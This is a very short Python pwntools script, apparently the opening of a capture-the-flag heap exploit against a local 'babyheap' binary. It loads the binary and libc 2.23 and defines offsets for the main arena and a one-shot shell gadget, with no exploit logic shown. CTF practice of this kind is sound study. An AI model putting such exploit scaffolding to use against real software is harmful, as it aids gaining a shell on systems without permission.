from pwn import *

io = process('./babyheap')
e = ELF('./babyheap')
l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

arena88_offset = 0x3c4b78
oneshot_offset = 0x45216


